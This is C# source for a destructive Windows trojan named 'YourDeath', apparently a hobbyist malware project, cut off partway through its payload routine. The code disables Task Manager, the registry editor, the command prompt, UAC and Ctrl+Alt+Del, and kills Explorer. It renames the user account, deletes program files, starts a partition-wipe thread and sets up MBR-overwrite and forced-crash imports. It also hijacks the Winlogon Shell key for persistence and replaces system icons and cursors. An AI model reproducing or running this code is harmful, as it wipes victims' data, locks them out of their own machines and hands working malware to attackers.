/* YourDeath Trojan

This software is written by Ali Diaa. ©️ All rights reserved.
I recommend you to run this computer virus on Windows 7. */

using System;
using System.Diagnostics;
using System.IO;
using Microsoft.Win32;
using System.Threading;
using System.Windows.Forms;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Drawing;
using System.Media;

namespace YourDeath
{
    public class YourClass
    {
        // DLL native imports for MBR (copied)
        [DllImport("kernel32")]
        private static extern IntPtr CreateFile(
            string lpFileName,
            uint dwDesiredAccess,
            uint dwShareMode,
            IntPtr lpSecurityAttributes,
            uint dwCreationDisposition,
            uint dwFlagsAndAttributes,
            IntPtr hTemplateFile);
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool CloseHandle(IntPtr hHandle);

        [DllImport("kernel32")]
        private static extern bool WriteFile(
            IntPtr hFile,
            byte[] lpBuffer,
            uint nNumberOfBytesToWrite,
            out uint lpNumberOfBytesWritten,
            IntPtr lpOverlapped);

        private const uint GenericRead = 0x80000000;
        private const uint GenericWrite = 0x40000000;
        private const uint GenericExecute = 0x20000000;
        private const uint GenericAll = 0x10000000;

        private const uint FileShareRead = 0x1;
        private const uint FileShareWrite = 0x2;

        // dwCreationDisposition
        private const uint OpenExisting = 0x3;

        // dwFlagsAndAttributes
        private const uint FileFlagDeleteOnClose = 0x4000000;

        private const uint MbrSize = 512u;

        // DLL native imports for BSOD (copied)
        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength);

        // DLL native imports for GDI (copied)
        [DllImport("gdi32.dll", EntryPoint = "CreateCompatibleDC", SetLastError = true)]
        static extern IntPtr CreateCompatibleDC(IntPtr hdc);
        [DllImport("gdi32.dll", EntryPoint = "CreateCompatibleBitmap")]
        static extern IntPtr CreateCompatibleBitmap(IntPtr hdc, int nWidth, int nHeight);
        [DllImport("gdi32.dll")]
        static extern IntPtr CreateSolidBrush(int crColor);
        [DllImport("gdi32.dll", EntryPoint = "SelectObject")]
        public static extern IntPtr SelectObject(IntPtr hdc, IntPtr hgdiobj);
        [DllImport("gdi32.dll", EntryPoint = "DeleteObject")]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool DeleteObject(IntPtr hObject);
        [DllImport("gdi32.dll", EntryPoint = "BitBlt", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool BitBlt(IntPtr hdc, int nXDest, int nYDest, int nWidth, int nHeight, IntPtr hdcSrc, int nXSrc, int nYSrc, TernaryRasterOperations dwRop);

        [DllImport("gdi32.dll", EntryPoint = "DeleteDC")]
        public static extern bool DeleteDC(IntPtr hdc);

        [DllImport("User32.dll")]
        static extern int ReleaseDC(IntPtr hwnd, IntPtr dc);

        [DllImport("user32.dll", SetLastError = true)]
        static extern IntPtr GetDC(IntPtr hWnd);

        [DllImport("user32.dll")]
        static extern IntPtr GetDesktopWindow();

        [DllImport("user32.dll")]
        static extern IntPtr GetWindowDC(IntPtr hWnd);

        [DllImport("user32.dll")]
        static extern bool InvalidateRect(IntPtr hWnd, IntPtr lpRect, bool bErase);

        [DllImport("gdi32.dll")]
        static extern bool StretchBlt(IntPtr hdcDest, int nXOriginDest, int nYOriginDest, int nWidthDest,
        int nHeightDest, IntPtr hdcSrc, int nXOriginSrc, int nYOriginSrc, int nWidthSrc, int nHeightSrc,
        TernaryRasterOperations dwRop);

        [StructLayout(LayoutKind.Sequential)]
        public struct POINT
        {
            public int X;
            public int Y;

            public POINT(int x, int y)
            {
                this.X = x;
                this.Y = y;
            }

            public static implicit operator Point(POINT p)
            {
                return new Point(p.X, p.Y);
            }

            public static implicit operator POINT(Point p)
            {
                return new POINT(p.X, p.Y);
            }
        }
        [StructLayout(LayoutKind.Sequential)]
        public struct BLENDFUNCTION
        {
            byte BlendOp;
            byte BlendFlags;
            byte SourceConstantAlpha;
            byte AlphaFormat;

            public BLENDFUNCTION(byte op, byte flags, byte alpha, byte format)
            {
                BlendOp = op;
                BlendFlags = flags;
                SourceConstantAlpha = alpha;
                AlphaFormat = format;
            }
        }

        //
        // currently defined blend operation
        //
        const int AC_SRC_OVER = 0x00;

        //
        // currently defined alpha format
        //
        const int AC_SRC_ALPHA = 0x01;

        public enum TernaryRasterOperations
        {
            SRCCOPY = 0x00CC0020,
            NOTSRCCOPY = 0x00330008,
        }

        [DllImport("gdi32.dll", ExactSpelling = true)]
        private static extern IntPtr BitBlt(IntPtr hDestDC, int x, int y, int nWidth, int nHeight, IntPtr hSrcDC, int xSrc, int ySrc, int dwRop);

        [DllImport("user32.dll")]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool GetWindowRect(IntPtr hWnd, out RECT lpRect);

        public const int DIRTY = 8658951;
        public const int NORMAL = 13369376;

        [StructLayout(LayoutKind.Sequential)]
        public struct RECT
        {
            public int Left;        // x position of upper-left corner
            public int Top;         // y position of upper-left corner
            public int Right;       // x position of lower-right corner
            public int Bottom;      // y position of lower-right corner
        }

        // Without this masterpiece, we can't extract anything!
        public static void Extract(string nameSpace, string outDirectory, string internalFilePath, string resourceName)
        {

            Assembly assembly = Assembly.GetCallingAssembly();

            using (Stream s = assembly.GetManifestResourceStream(nameSpace + "." + (internalFilePath == "" ? "" : internalFilePath + ".") + resourceName))
            using (BinaryReader r = new BinaryReader(s))
            using (FileStream fs = new FileStream(outDirectory + "\\" + resourceName, FileMode.OpenOrCreate))
            using (BinaryWriter w = new BinaryWriter(fs))
                w.Write(r.ReadBytes((int)s.Length));
        }
        public static void Main()
        {
            DialogResult result = MessageBox.Show("This software is considered malware." + Environment.NewLine + "Are you sure you want to continue? This option can't be undone, and your sins can't be erased if you continue!", "YourDeath - Alert", MessageBoxButtons.YesNo, MessageBoxIcon.Warning);
            if (result == DialogResult.Yes)
            {
                YourClass payloader = new YourClass();
                Thread payloads = new Thread(payloader.Payloads);
                payloads.Start();
            }
            else
            {
                Environment.Exit(0);
            }
        }

        public void Payloads()
        {
            string Virus_Path = @"C:\Program Files\Temp\Hmm\What\Oh\Wait\DoNotTouchMe\Well\YouDid\Sigh\Critical\Idk\YourParentsAreMad\ItIsMe\YouAreDeadAnyway\YourDeath.exe";

            if (!File.Exists(Virus_Path))
            {
                // Threads
                Thread dataWipe = new Thread(WipePartitions);
                Thread msgboxes = new Thread(MsgBox);
                Thread flashing = new Thread(ScreenFlashing);
                Thread melting = new Thread(ScreenMelting);

                // Create the resources folder
                string resources = @"C:\Program Files\Temp\Hmm\What\Oh\Wait\DoNotTouchMe\Well\YouDid\Sigh\Critical\Idk\YourParentsAreMad\ItIsMe\YouAreDeadAnyway";
                Directory.CreateDirectory(resources);

                // Simple note writer
                StreamWriter Note = new StreamWriter(resources + @"\Note.txt");
                Note.Write("Your computer has been trashed by the YourDeath Trojan, and you're now dead!" + Environment.NewLine + "Don't try to reboot your computer or kill YourDeath, " + Environment.NewLine + "this isn't a good idea!" + Environment.NewLine + "Good luck!");
                Note.Close();

                // Start the note
                Process.Start(resources + @"\Note.txt");

                // Disable the task manager
                RegistryKey DisTaskMgr = Registry.CurrentUser.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System");
                DisTaskMgr.SetValue("DisableTaskMgr", 1, RegistryValueKind.DWord);

                // Disable the registry editor
                RegistryKey DisRegedit = Registry.CurrentUser.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System");
                DisRegedit.SetValue("DisableRegistryTools", 1, RegistryValueKind.DWord);

                // Disable the command prompt
                RegistryKey DisCMD = Registry.CurrentUser.CreateSubKey(@"Software\Policies\Microsoft\Windows\System");
                DisCMD.SetValue("DisableCMD", 2, RegistryValueKind.DWord);

                // Wipe data
                dataWipe.Start();

                // Extract all required resources
                Extract("YourDeath", resources, "Resources", "YourDeath.exe");
                Extract("YourDeath", resources, "Resources", "a lot of skulls.jpg");
                Extract("YourDeath", resources, "Resources", "disctrl.reg");
                Extract("YourDeath", resources, "Resources", "hol333.ani");
                Extract("YourDeath", resources, "Resources", "skull_real_ico.ico");
                Extract("YourDeath", resources, "Resources", "skull_real.png");
                Extract("YourDeath", resources, "Resources", "YourImage.jpg");
                Extract("YourDeath", resources, "Resources", "YourDeath_HTML.html");
                Extract("YourDeath", resources, "Resources", "RunAway.exe");

                Thread.Sleep(5000);

                // Message box start
                msgboxes.Start();

                // Horrible sound effect
                Stream str = Properties.Resources.Horror;
                SoundPlayer snd = new SoundPlayer(str);
                snd.Play();

                Thread.Sleep(5000);

                // Start screen flashing
                flashing.Start();

                // Start screen melting
                melting.Start();

                // Disable the CTRL+ALT+DEL option
                const string quote = "\"";
                ProcessStartInfo ctrlaltdel = new ProcessStartInfo();
                ctrlaltdel.FileName = "cmd.exe";
                ctrlaltdel.WindowStyle = ProcessWindowStyle.Hidden;
                ctrlaltdel.Arguments = @"/k regedit /s " + quote + @"C:\Program Files\Temp\disctrl.reg" + quote + " && exit";
                Process.Start(ctrlaltdel);

                // Kill Windows Explorer
                Thread.Sleep(3000);
                Process[] pname2 = Process.GetProcessesByName("explorer");
                if (pname2.Length == 1)
                {
                    ProcessStartInfo block_exp = new ProcessStartInfo();
                    block_exp.FileName = "cmd.exe";
                    block_exp.WindowStyle = ProcessWindowStyle.Hidden;
                    block_exp.Arguments = @"/k taskkill /f /im explorer.exe && exit";
                    Process.Start(block_exp);
                }

                // Change the username
                Thread.Sleep(1000);
                ProcessStartInfo usrnme1 = new ProcessStartInfo();
                usrnme1.FileName = "cmd.exe";
                usrnme1.WindowStyle = ProcessWindowStyle.Hidden;
                usrnme1.Arguments = @"/k wmic useraccount where name='%username%' rename 'UR DEAD' && exit";
                Process.Start(usrnme1);

                Thread.Sleep(1000);
                ProcessStartInfo usrnme2 = new ProcessStartInfo();
                usrnme2.FileName = "cmd.exe";
                usrnme2.WindowStyle = ProcessWindowStyle.Hidden;
                usrnme2.Arguments = @"/k wmic useraccount where name='%username%' set FullName='UR DEAD' && exit";
                Process.Start(usrnme2);

                // Delete all Windows applications if exists
                string WinApps_Path = @"C:\Program Files\WindowsApps";
                Thread.Sleep(1000);
                if (File.Exists(WinApps_Path))
                {
                    ProcessStartInfo winappdel = new ProcessStartInfo();
                    winappdel.FileName = "cmd.exe";
                    winappdel.WindowStyle = ProcessWindowStyle.Hidden;
                    winappdel.Arguments = @"/k del /f /s /q C:\Program Files\WindowsApps";
                    Process.Start(winappdel);
                }
                // Some registry payloads
                Thread.Sleep(2000);
                RegistryKey keyUAC = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
                keyUAC.SetValue("EnableLUA", 0, RegistryValueKind.DWord);
                RegistryKey folder = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Icons");
                folder.SetValue("3", "C:\\Program Files\\Temp\\Hmm\\What\\Oh\\Wait\\DoNotTouchMe\\Well\\YouDid\\Sigh\\Critical\\Idk\\YourParentsAreMad\\ItIsMe\\YouAreDeadAnyway\\skull_real_ico.ico", RegistryValueKind.String);
                RegistryKey folder2 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Icons");
                folder2.SetValue("4", "C:\\Program Files\\Temp\\Hmm\\What\\Oh\\Wait\\DoNotTouchMe\\Well\\YouDid\\Sigh\\Critical\\Idk\\YourParentsAreMad\\ItIsMe\\YouAreDeadAnyway\\skull_real_ico.ico", RegistryValueKind.String);
                RegistryKey explorer = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon");
                explorer.SetValue("Shell", "explorer.exe, C:\\Program Files\\Temp\\Hmm\\What\\Oh\\Wait\\DoNotTouchMe\\Well\\YouDid\\Sigh\\Critical\\Idk\\YourParentsAreMad\\ItIsMe\\YouAreDeadAnyway\\YourDeath.exe", RegistryValueKind.String);
                RegistryKey disregedit = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
                disregedit.SetValue("DisableRegistryTools", 1, RegistryValueKind.DWord);
                RegistryKey ico_exe = Registry.ClassesRoot.CreateSubKey("exefile\\DefaultIcon");
                ico_exe.SetValue("", "C:\\Program Files\\Temp\\Hmm\\What\\Oh\\Wait\\DoNotTouchMe\\Well\\YouDid\\Sigh\\Critical\\Idk\\YourParentsAreMad\\ItIsMe\\YouAreDeadAnyway\\skull_real_ico.ico");
                RegistryKey ico_giff = Registry.ClassesRoot.CreateSubKey("giffile\\DefaultIcon");
                ico_giff.SetValue("", "C:\\Program Files\\Temp\\Hmm\\What\\Oh\\Wait\\DoNotTouchMe\\Well\\YouDid\\Sigh\\Critical\\Idk\\YourParentsAreMad\\ItIsMe\\YouAreDeadAnyway\\skull_real_ico.ico");
                RegistryKey ico_htlm = Registry.ClassesRoot.CreateSubKey("htlm\\DefaultIcon");
                ico_htlm.SetValue("", "C:\\Program Files\\Temp\\Hmm\\What\\Oh\\Wait\\DoNotTouchMe\\Well\\YouDid\\Sigh\\Critical\\Idk\\YourParentsAreMad\\ItIsMe\\YouAreDeadAnyway\\skull_real_ico.ico");
                RegistryKey ico_icmfile = Registry.ClassesRoot.CreateSubKey("icmfile\\DefaultIcon");
                ico_icmfile.SetValue("", "C:\\Program Files\\Temp\\Hmm\\What\\Oh\\Wait\\DoNotTouchMe\\Well\\YouDid\\Sigh\\Critical\\Idk\\YourParentsAreMad\\ItIsMe\\YouAreDeadAnyway\\skull_real_ico.ico");
                RegistryKey ico_icofile = Registry.ClassesRoot.CreateSubKey("icofile\\DefaultIcon");
                ico_icofile.SetValue("", "C:\\Program Files\\Temp\\Hmm\\What\\Oh\\Wait\\DoNotTouchMe\\Well\\YouDid\\Sigh\\Critical\\Idk\\YourParentsAreMad\\ItIsMe\\YouAreDeadAnyway\\skull_real_ico.ico");
                RegistryKey ico_inffile = Registry.ClassesRoot.CreateSubKey("inffile\\DefaultIcon");
                ico_inffile.SetValue("", "C:\\Program Files\\Temp\\Hmm\\What\\Oh\\Wait\\DoNotTouchMe\\Well\\YouDid\\Sigh\\Critical\\Idk\\YourParentsAreMad\\ItIsMe\\YouAreDeadAnyway\\skull_real_ico.ico");
                RegistryKey ico_inifile = Registry.ClassesRoot.CreateSubKey("inifile\\DefaultIcon");
                ico_inifile.SetValue("", "C:\\Program Files\\Temp\\Hmm\\What\\Oh\\Wait\\DoNotTouchMe\\Well\\YouDid\\Sigh\\Critical\\Idk\\YourParentsAreMad\\ItIsMe\\YouAreDeadAnyway\\skull_real_ico.ico");
                RegistryKey ico_jntfile = Registry.ClassesRoot.CreateSubKey("jntfile\\DefaultIcon");
                ico_jntfile.SetValue("", "C:\\Program Files\\Temp\\Hmm\\What\\Oh\\Wait\\DoNotTouchMe\\Well\\YouDid\\Sigh\\Critical\\Idk\\YourParentsAreMad\\ItIsMe\\YouAreDeadAnyway\\skull_real_ico.ico");
                RegistryKey ico_jpegfile = Registry.ClassesRoot.CreateSubKey("jpegfile\\DefaultIcon");
                ico_jpegfile.SetValue("", "C:\\Program Files\\Temp\\Hmm\\What\\Oh\\Wait\\DoNotTouchMe\\Well\\YouDid\\Sigh\\Critical\\Idk\\YourParentsAreMad\\ItIsMe\\YouAreDeadAnyway\\skull_real_ico.ico");
                RegistryKey ico_JSEFile = Registry.ClassesRoot.CreateSubKey("JSEFile\\DefaultIcon");
                ico_JSEFile.SetValue("", "C:\\Program Files\\Temp\\Hmm\\What\\Oh\\Wait\\DoNotTouchMe\\Well\\YouDid\\Sigh\\Critical\\Idk\\YourParentsAreMad\\ItIsMe\\YouAreDeadAnyway\\skull_real_ico.ico");
                RegistryKey ico_JSFile = Registry.ClassesRoot.CreateSubKey("JSFile\\DefaultIcon");
                ico_JSFile.SetValue("", "C:\\Program Files\\Temp\\Hmm\\What\\Oh\\Wait\\DoNotTouchMe\\Well\\YouDid\\Sigh\\Critical\\Idk\\YourParentsAreMad\\ItIsMe\\YouAreDeadAnyway\\skull_real_ico.ico");
                RegistryKey ico_mscfile = Registry.ClassesRoot.CreateSubKey("mscfile\\DefaultIcon");
                ico_mscfile.SetValue("", "C:\\Program Files\\Temp\\Hmm\\What\\Oh\\Wait\\DoNotTouchMe\\Well\\YouDid\\Sigh\\Critical\\Idk\\YourParentsAreMad\\ItIsMe\\YouAreDeadAnyway\\skull_real_ico.ico");
                RegistryKey ico_pjpegfile = Registry.ClassesRoot.CreateSubKey("pjpegfile\\DefaultIcon");
                ico_pjpegfile.SetValue("", "C:\\Program Files\\Temp\\Hmm\\What\\Oh\\Wait\\DoNotTouchMe\\Well\\YouDid\\Sigh\\Critical\\Idk\\YourParentsAreMad\\ItIsMe\\YouAreDeadAnyway\\skull_real_ico.ico");
                RegistryKey ico_pnffile = Registry.ClassesRoot.CreateSubKey("pnffile\\DefaultIcon");
                ico_pnffile.SetValue("", "C:\\Program Files\\Temp\\Hmm\\What\\Oh\\Wait\\DoNotTouchMe\\Well\\YouDid\\Sigh\\Critical\\Idk\\YourParentsAreMad\\ItIsMe\\YouAreDeadAnyway\\skull_real_ico.ico");
                RegistryKey ico_pngfile = Registry.ClassesRoot.CreateSubKey("pngfile\\DefaultIcon");
                ico_pngfile.SetValue("", "C:\\Program Files\\Temp\\Hmm\\What\\Oh\\Wait\\DoNotTouchMe\\Well\\YouDid\\Sigh\\Critical\\Idk\\YourParentsAreMad\\ItIsMe\\YouAreDeadAnyway\\skull_real_ico.ico");
                RegistryKey ico_txt = Registry.ClassesRoot.CreateSubKey("txtfile\\DefaultIcon");
                ico_txt.SetValue("", "C:\\Program Files\\Temp\\Hmm\\What\\Oh\\Wait\\DoNotTouchMe\\Well\\YouDid\\Sigh\\Critical\\Idk\\YourParentsAreMad\\ItIsMe\\YouAreDeadAnyway\\skull_real_ico.ico");
                RegistryKey ico_ratfile = Registry.ClassesRoot.CreateSubKey("ratfile\\DefaultIcon");
                ico_ratfile.SetValue("", "C:\\Program Files\\Temp\\Hmm\\What\\Oh\\Wait\\DoNotTouchMe\\Well\\YouDid\\Sigh\\Critical\\Idk\\YourParentsAreMad\\ItIsMe\\YouAreDeadAnyway\\skull_real_ico.ico");
                RegistryKey ico_regfile = Registry.ClassesRoot.CreateSubKey("regfile\\DefaultIcon");
                ico_regfile.SetValue("", "C:\\Program Files\\Temp\\Hmm\\What\\Oh\\Wait\\DoNotTouchMe\\Well\\YouDid\\Sigh\\Critical\\Idk\\YourParentsAreMad\\ItIsMe\\YouAreDeadAnyway\\skull_real_ico.ico");
                RegistryKey ico_sysfile = Registry.ClassesRoot.CreateSubKey("sysfile\\DefaultIcon");
                ico_sysfile.SetValue("", "C:\\Program Files\\Temp\\Hmm\\What\\Oh\\Wait\\DoNotTouchMe\\Well\\YouDid\\Sigh\\Critical\\Idk\\YourParentsAreMad\\ItIsMe\\YouAreDeadAnyway\\skull_real_ico.ico");
                RegistryKey ico_textfile = Registry.ClassesRoot.CreateSubKey("textfile\\DefaultIcon");
                ico_textfile.SetValue("", "C:\\Program Files\\Temp\\Hmm\\What\\Oh\\Wait\\DoNotTouchMe\\Well\\YouDid\\Sigh\\Critical\\Idk\\YourParentsAreMad\\ItIsMe\\YouAreDeadAnyway\\skull_real_ico.ico");
                RegistryKey ico_xmlfile = Registry.ClassesRoot.CreateSubKey("xmlfile\\DefaultIcon");
                ico_xmlfile.SetValue("", "C:\\Program Files\\Temp\\Hmm\\What\\Oh\\Wait\\DoNotTouchMe\\Well\\YouDid\\Sigh\\Critical\\Idk\\YourParentsAreMad\\ItIsMe\\YouAreDeadAnyway\\skull_real_ico.ico");
                RegistryKey ico_zapfile = Registry.ClassesRoot.CreateSubKey("zapfile\\DefaultIcon");
                ico_zapfile.SetValue("", "C:\\Program Files\\Temp\\Hmm\\What\\Oh\\Wait\\DoNotTouchMe\\Well\\YouDid\\Sigh\\Critical\\Idk\\YourParentsAreMad\\ItIsMe\\YouAreDeadAnyway\\skull_real_ico.ico");
                RegistryKey ico_dllfile = Registry.ClassesRoot.CreateSubKey("dllfile\\DefaultIcon");
                ico_dllfile.SetValue("", "C:\\Program Files\\Temp\\Hmm\\What\\Oh\\Wait\\DoNotTouchMe\\Well\\YouDid\\Sigh\\Critical\\Idk\\YourParentsAreMad\\ItIsMe\\YouAreDeadAnyway\\skull_real_ico.ico");
                RegistryKey ico_jarfile = Registry.ClassesRoot.CreateSubKey("jarfile\\DefaultIcon");
                ico_jarfile.SetValue("", "C:\\Program Files\\Temp\\Hmm\\What\\Oh\\Wait\\DoNotTouchMe\\Well\\YouDid\\Sigh\\Critical\\Idk\\YourParentsAreMad\\ItIsMe\\YouAreDeadAnyway\\skull_real_ico.ico");
                RegistryKey ico_recycle = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\CLSID\\{645FF040-5081-101B-9F08-00AA002F954E}\\DefaultIcon");
                ico_recycle.SetValue("", "C:\\Program Files\\Temp\\Hmm\\What\\Oh\\Wait\\DoNotTouchMe\\Well\\YouDid\\Sigh\\Critical\\Idk\\YourParentsAreMad\\ItIsMe\\YouAreDeadAnyway\\skull_real_ico.ico");
                RegistryKey ico_recycle2 = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\CLSID\\{645FF040-5081-101B-9F08-00AA002F954E}\\DefaultIcon");
                ico_recycle2.SetValue("empty", "C:\\Program Files\\Temp\\Hmm\\What\\Oh\\Wait\\DoNotTouchMe\\Well\\YouDid\\Sigh\\Critical\\Idk\\YourParentsAreMad\\ItIsMe\\YouAreDeadAnyway\\skull_real_ico.ico");
                RegistryKey ico_recycle3 = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\CLSID\\{645FF040-5081-101B-9F08-00AA002F954E}\\DefaultIcon");
                ico_recycle3.SetValue("full", "C:\\Program Files\\Temp\\Hmm\\What\\Oh\\Wait\\DoNotTouchMe\\Well\\YouDid\\Sigh\\Critical\\Idk\\YourParentsAreMad\\ItIsMe\\YouAreDeadAnyway\\skull_real_ico.ico");
                RegistryKey ico_pic = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\CLSID\\{20D04FE0-3AEA-1069-A2D8-08002B30309D}\\DefaultIcon");
                ico_pic.SetValue("", "C:\\Program Files\\Temp\\Hmm\\What\\Oh\\Wait\\DoNotTouchMe\\Well\\YouDid\\Sigh\\Critical\\Idk\\YourParentsAreMad\\ItIsMe\\YouAreDeadAnyway\\skull_real_ico.ico");
                RegistryKey ico_idk1 = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\CLSID\\{59031A47-3F72-44A7-89C5-5595FE6B30EE}\\DefaultIcon");
                ico_idk1.SetValue("", "C:\\Program Files\\Temp\\Hmm\\What\\Oh\\Wait\\DoNotTouchMe\\Well\\YouDid\\Sigh\\Critical\\Idk\\YourParentsAreMad\\ItIsMe\\YouAreDeadAnyway\\skull_real_ico.ico");
                RegistryKey ico_idk2 = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\CLSID\\{871C5380-42A0-1069-A2EA-08002B30309D}\\DefaultIcon");
                ico_idk2.SetValue("", "C:\\Program Files\\Temp\\Hmm\\What\\Oh\\Wait\\DoNotTouchMe\\Well\\YouDid\\Sigh\\Critical\\Idk\\YourParentsAreMad\\ItIsMe\\YouAreDeadAnyway\\skull_real_ico.ico");
                RegistryKey ico_idk3 = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\CLSID\\{F02C1A0D-BE21-4350-88B0-7367FC96EF3C}\\DefaultIcon");
                ico_idk3.SetValue("", "C:\\Program Files\\Temp\\Hmm\\What\\Oh\\Wait\\DoNotTouchMe\\Well\\YouDid\\Sigh\\Critical\\Idk\\YourParentsAreMad\\ItIsMe\\YouAreDeadAnyway\\skull_real_ico.ico");
                RegistryKey ico_idk5 = Registry.CurrentUser.CreateSubKey("Software\\Classes\\CLSID\\{031E4825-7B94-4dc3-B131-E946B44C8DD5}\\DefaultIcon");
                ico_idk5.SetValue("", "C:\\Program Files\\Temp\\Hmm\\What\\Oh\\Wait\\DoNotTouchMe\\Well\\YouDid\\Sigh\\Critical\\Idk\\YourParentsAreMad\\ItIsMe\\YouAreDeadAnyway\\skull_real_ico.ico");
                RegistryKey ico_idk4 = Registry.CurrentUser.CreateSubKey("Software\\Classes\\CLSID\\{1248BD21-B584-4EB8-85D0-8EC479CD043B}\\DefaultIcon");
                ico_idk4.SetValue("", "C:\\Program Files\\Temp\\Hmm\\What\\Oh\\Wait\\DoNotTouchMe\\Well\\YouDid\\Sigh\\Critical\\Idk\\YourParentsAreMad\\ItIsMe\\YouAreDeadAnyway\\skull_real_ico.ico");
                RegistryKey cur = Registry.CurrentUser.CreateSubKey("Control Panel\\Cursors");
                cur.SetValue("", "C:\\Program Files\\Temp\\Hmm\\What\\Oh\\Wait\\DoNotTouchMe\\Well\\YouDid\\Sigh\\Critical\\Idk\\YourParentsAreMad\\ItIsMe\\YouAreDeadAnyway\\hol333.ani");
                RegistryKey cur2 = Registry.CurrentUser.CreateSubKey("Control Panel\\Cursors");
                cur2.SetValue("AppStarting", "C:\\Program Files\\Temp\\Hmm\\What\\Oh\\Wait\\DoNotTouchMe\\Well\\YouDid\\Sigh\\Critical\\Idk\\YourParentsAreMad\\ItIsMe\\YouAreDeadAnyway\\hol333.ani");
                RegistryKey cur3 = Registry.CurrentUser.CreateSubKey("Control Panel\\Cursors");
                cur3.SetValue("Arrow", "C:\\Program Files\\Temp\\Hmm\\What\\Oh\\Wait\\DoNotTouchMe\\Well\\YouDid\\Sigh\\Critical\\Idk\\YourParentsAreMad\\ItIsMe\\YouAreDeadAnyway\\hol333.ani");
                RegistryKey cur4 = Registry.CurrentUser.CreateSubKey("Control Panel\\Cursors");
                cur4.SetValue("Hand", "C:\\Program Files\\Temp\\Hmm\\What\\Oh\\Wait\\DoNotTouchMe\\Well\\YouDid\\Sigh\\Critical\\Idk\\YourParentsAreMad\\ItIsMe\\YouAreDeadAnyway\\hol333.ani");
                RegistryKey cur5 = Registry.CurrentUser.CreateSubKey("Control Panel\\Cursors");
                cur5.SetValue("Help", "C:\\Program Files\\Temp\\Hmm\\What\\Oh\\Wait\\DoNotTouchMe\\Well\\YouDid\\Sigh\\Critical\\Idk\\YourParentsAreMad\\ItIsMe\\YouAreDeadAnyway\\hol333.ani");
                RegistryKey cur6 = Registry.CurrentUser.CreateSubKey("Control Panel\\Cursors");
                cur6.SetValue("No", "C:\\Program Files\\Temp\\Hmm\\What\\Oh\\Wait\\DoNotTouchMe\\Well\\YouDid\\Sigh\\Critical\\Idk\\YourParentsAreMad\\ItIsMe\\YouAreDeadAnyway\\hol333.ani");
                RegistryKey cur7 = Registry.CurrentUser.CreateSubKey("Control Panel\\Cursors");
                cur7.SetValue("NWPen", "C:\\Program Files\\Temp\\Hmm\\What\\Oh\\Wait\\DoNotTouchMe\\Well\\YouDid\\Sigh\\Critical\\Idk\\YourParentsAreMad\\ItIsMe\\YouAreDeadAnyway\\hol333.ani");
                RegistryKey cur8 = Registry.CurrentUser.CreateSubKey("Control Panel\\Cursors");
                cur8.SetValue("SizeAll", "C:\\Program Files\\Temp\\Hmm\\What\\Oh\\Wait\\DoNotTouchMe\\Well\\YouDid\\Sigh\\Critical\\Idk\\YourParentsAreMad\\ItIsMe\\YouAreDeadAnyway\\hol333.ani");
                RegistryKey cur9 = Registry.CurrentUser.CreateSubKey("Control Panel\\Cursors");
                cur9.SetValue("SizeNESW", "C:\\Program Files\\Temp\\Hmm\\What\\Oh\\Wait\\DoNotTouchMe\\Well\\YouDid\\Sigh\\Critical\\Idk\\YourParentsAreMad\\ItIsMe\\YouAreDeadAnyway\\hol333.ani");
                RegistryKey cur10 = Registry.CurrentUser.CreateSubKey("Control Panel\\Cursors");
                cur10.SetValue("SizeNS", "C:\\Program Files\\Temp\\Hmm\\What\\Oh\\Wait\\DoNotTouchMe\\Well\\YouDid\\Sigh\\Critical\\Idk\\YourParentsAreMad\\ItIsMe\\YouAreDeadAnyway\\hol333.ani");
                RegistryKey cur11 = Registry.CurrentUser.CreateSubKey("Control Panel\\Cursors");
                cur11.SetValue("SizeNWSE", "C:\\Program Files\\Temp\\Hmm\\What\\Oh\\Wait\\DoNotTouchMe\\Well\\YouDid\\Sigh\\Critical\\Idk\\YourParentsAreMad\\ItIsMe\\YouAreDeadAnyway\\hol333.ani");
                RegistryKey cur12 = Registry.CurrentUser.CreateSubKey("Control Panel\\Cursors");
                cur12.SetValue("SizeWE", "C:\\Program Files\\Temp\\Hmm\\What\\Oh\\Wait\\DoNotTouchMe\\Well\\YouDid\\Sigh\\Critical\\Idk\\YourParentsAreMad\\ItIsMe\\YouAreDeadAnyway\\hol333.ani");
                RegistryKey cur13 = Registry.CurrentUser.CreateSubKey("Control Panel\\Cursors");
                cur13.SetValue("UpArrow", "C:\\Program Files\\Temp\\Hmm\\What\\Oh\\Wait\\DoNotTouchMe\\Well\\YouDid\\Sigh\\Critical\\Idk\\YourParentsAreMad\\ItIsMe\\YouAreDeadAnyway\\hol333.ani");
                RegistryKey cur14 = Registry.CurrentUser.CreateSubKey("Control Panel\\Cursors");
                cur14.SetValue("Wait", "C:\\Program Files\\Temp\\Hmm\\What\\Oh\\Wait\\DoNotTouchMe\\Well\\YouDid\\Sigh\\Critical\\Idk\\YourParentsAreMad\\ItIsMe\\YouAreDeadAnyway\\hol333.ani");

                // Replace the wallpaper and prevent user to change it back
